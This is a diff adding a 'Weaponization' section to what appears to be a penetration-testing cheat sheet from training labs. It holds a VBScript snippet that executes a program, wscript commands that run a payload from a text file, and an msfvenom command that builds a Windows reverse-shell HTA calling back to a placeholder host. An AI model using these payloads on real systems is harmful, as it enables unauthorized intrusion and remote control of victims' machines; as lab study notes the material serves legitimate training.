@@ -95,6 +95,17 @@ Python
 (ctrl+z)  
 `stty raw -echo; fg`  
 
+# Weaponization
+
+### Windows
+Payload for executing exe files with VBScript:
+`Set shell = WScript.CreateObject("Wscript.Shell")`
+`shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True`
+`wscript PATH_TO_FILE` or `cscript PATH_TO_FILE`
+Using txt file:
+`wscript /e:VBScript c:\Users\thm\Desktop\payload.txt`
+   
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=443 -f hta-psh -o thm.hta`
 
 
 # Privesc
